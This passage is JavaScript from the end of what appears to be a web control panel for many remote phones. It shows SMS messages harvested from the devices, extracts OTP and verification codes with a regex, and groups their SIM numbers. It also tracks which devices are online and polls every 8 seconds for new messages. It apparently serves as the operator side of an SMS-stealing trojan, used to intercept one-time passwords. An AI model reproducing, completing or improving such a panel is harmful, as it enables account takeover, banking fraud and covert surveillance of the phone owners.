function simOp(s){var l=(s||'').toLowerCase();if(l.includes('jio')||l.includes('ril'))return'sim-jio';if(l.includes('airtel')||l.includes('air'))return'sim-air';if(l.includes('vi')||l.includes('vodafone')||l.includes('idea'))return'sim-vi';if(l.includes('bsnl')||l.includes('bs'))return'sim-bs';return'sim-oth'}

// ====== SMS ======
function filterSms(){
  var q=document.getElementById('smsS').value.toLowerCase();
  var all=SMS_CACHE;
  if(q)all=all.filter(function(s){return(s.body||'').toLowerCase().includes(q)||(s.sender||'').toLowerCase().includes(q)});
  var html='',lim=Math.min(all.length,500);
  for(var i=0;i<lim;i++){
    var m=all[i],b=m.body||'',o=extOtp(b),di=m._dev||'',dv=DEV[di]?DEV[di].d_name||'Device':'';
    html+='<div class="sms-i glass"><div class="s-sender">'+esc(m.sender||'Unknown')+'</div>'
      +'<div class="s-via">via '+esc(dv||di.slice(0,12))+'</div>'
      +'<div class="s-body">'+esc(b)+'</div><div class="s-btm"><span>'+fmt(m.date||m.timestamp)+'</span>'
      +(o?'<span class="s-otp">'+esc(o)+'</span>':'')
      +'<span style="cursor:pointer;padding:2px 6px;border-radius:3px;background:rgba(255,255,255,.03)" onclick="navigator.clipboard.writeText(\''+esc(b).replace(/'/g,"\\'")+'\');show(\'Copied\')">Copy</span></div></div>';
  }
  if(all.length>lim)html+='<div class="sms-e">Showing '+lim+' of '+all.length+'</div>';
  if(!all.length)html='<div class="sms-e">'+(q?'No matches':'No SMS')+'</div>';
  document.getElementById('smsL').innerHTML=html;
  buildOtps();
  document.getElementById('smsP').textContent=all.length+' SMS';
}

function extOtp(t){var m=(t||'').match(/(?:OTP|code|verif|login|one.?time|otp)\s*(?::|is)?\s*(\d{4,8})/i);if(m)return m[1];return null}

function buildOtps(){
  if(!SMS_CACHE.length){OTP_CACHE=[];filterOtp();return}
  var seen={};
  OTP_CACHE=SMS_CACHE.filter(function(s){var o=extOtp(s.body||'');if(!o)return false;var k=o+'_'+(s._dev||'');if(seen[k])return false;seen[k]=1;s._otp=o;return true});
  filterOtp();
}

function filterOtp(){
  var q=document.getElementById('otpS').value.toLowerCase();
  var all=OTP_CACHE;
  if(q)all=all.filter(function(s){return(s._otp||'').includes(q)||(s.body||'').toLowerCase().includes(q)});
  var html='',lim=Math.min(all.length,200);
  for(var i=0;i<lim;i++){var m=all[i],b=m.body||'',di=m._dev||'',dv=DEV[di]?DEV[di].d_name||'Device':'';html+='<div class="sms-i glass"><div class="s-sender" style="color:#f03ca0">🔑 '+esc(m._otp)+'</div><div class="s-via">via '+esc(dv||di.slice(0,12))+'</div><div class="s-body">'+esc(b)+'</div><div class="s-btm"><span>'+fmt(m.date||m.timestamp)+'</span></div></div>'}
  if(!all.length)html='<div class="sms-e">'+(q?'No matches':'No OTPs')+'</div>';
  document.getElementById('otpL').innerHTML=html;
  document.getElementById('otpP').textContent=all.length+' OTPs';
}

// ====== SIM ======
function buildSims(){
  var nums={};
  DLIST.forEach(function(i){var d=i.dev,p=ph(d),n1=nv(d.numberSim1),n2=nv(d.numberSim2),aph={};if(p)aph[p]=1;if(n1&&n1!==p)aph[n1]=1;if(n2&&n2!==p&&n2!==n1)aph[n2]=1;Object.keys(aph).forEach(function(num){if(!nums[num])nums[num]={num:num,devices:{}};nums[num].devices[i.id]=d})});
  SIMS_CACHE=Object.keys(nums).sort().map(function(k){return nums[k]});
  filterSims();
}
function nv(v){return(v&&v!=='Not Available'&&v!=='No Data'&&v!=='No SIM Found'&&v!=='Unknown'&&v!=='Restricted'&&v!=='-')?v:''}
function filterSims(){
  var q=document.getElementById('simS').value.toLowerCase();
  var all=SIMS_CACHE;
  if(q)all=all.filter(function(s){return s.num.includes(q)});
  if(SIMF==='online')all=all.filter(function(s){return Object.values(s.devices).some(function(d){return d.status==='online'})});
  var html='';
  all.forEach(function(s){var devs=Object.values(s.devices),onDev=devs.filter(function(d){return d.status==='online'}).length;html+='<div class="d-card glass"><div class="d-top"><div class="d-name" style="font-size:14px;letter-spacing:.5px">'+esc(s.num)+'</div><div class="d-status" style="border:1px solid rgba(108,60,240,.15);color:#6c3cf0;background:rgba(108,60,240,.06)">'+devs.length+' dev</div></div><div class="d-row"><div>Online: <strong style="color:#1ec864">'+onDev+'</strong></div></div>';devs.forEach(function(d){html+='<div class="full" style="font-size:10px">'+esc(d.d_name||'Device')+' ['+(d.status||'offline')+'] '+esc(d.numberSim1||'')+'</div>'});html+='</div>'});
  if(!all.length)html='<div class="sms-e">'+(q?'No matches':'No numbers')+'</div>';
  document.getElementById('simGrid').innerHTML=html;
  document.getElementById('simP').textContent=all.length+' numbers';
}
function setSimF(f,btn){SIMF=f;document.querySelectorAll('#tSims .f-btn').forEach(function(b){b.classList.remove('act')});if(btn)btn.classList.add('act');filterSims()}

// ====== TABS ======
function switchTab(t,btn){
  document.querySelectorAll('.tab-btn').forEach(function(b){b.classList.remove('active')});
  if(btn)btn.classList.add('active');
  document.querySelectorAll('.tab-p').forEach(function(p){p.classList.remove('active');p.style.display='none'});
  var el=document.getElementById({devices:'tDevices',sms:'tSms',otp:'tOtp',sims:'tSims',ping:'tPing'}[t]);
  if(el){el.classList.add('active');el.style.display='block'}
  if(t==='sms'&&!SMS_CACHE.length)loadSms();
  if(t==='otp'&&!OTP_CACHE.length&&SMS_CACHE.length)buildOtps();
  if(t==='sims'&&!SIMS_CACHE.length)buildSims();
}

function fmt(t){
  if(!t)return '';
  if(typeof t==='string'&&t.match(/^\d{2}\/\d{2}\/\d{4}/)){var p=t.split(/[\s\/:]/);var d=new Date(p[2],p[1]-1,p[0],p[3]||0,p[4]||0,p[5]||0);if(p[6]&&p[6].toLowerCase()==='pm'&&p[3]<12)d.setHours(d.getHours()+12);if(p[6]&&p[6].toLowerCase()==='am'&&p[3]===12)d.setHours(0);if(!isNaN(d.getTime()))return d.toLocaleString()}
  var d=new Date(Number(t)||t);if(!isNaN(d.getTime()))return d.toLocaleString();
  return String(t).slice(0,16);
}

// ====== POLLING ======
function startPoll(){
  if(polling)clearInterval(polling);
  polling=setInterval(function(){
    ajax('devices').then(function(dd){if(!dd||!dd.devices)return;DEV=dd.devices;DLIST=Object.keys(DEV).map(function(id){return{id:id,dev:DEV[id]}});document.getElementById('sTot').textContent=dd.total;document.getElementById('sOn').textContent=dd.online;document.getElementById('sOff').textContent=dd.offline;applyFilter()});
    ajax('sms').then(function(sm){if(!sm)return;var old=SMS_CACHE.length;SMS_CACHE=sm||[];document.getElementById('sSms').textContent=SMS_CACHE.length;filterSms();if(SMS_CACHE.length>old)show('📩 '+(SMS_CACHE.length-old)+' new SMS!')});
    ajax('ping').then(function(pg){if(pg&&pg.ping)document.getElementById('sPing').textContent=pg.ping+'ms'});
  }, 8000);
}

loadAll();
startPoll();
</script>
</body>
</html>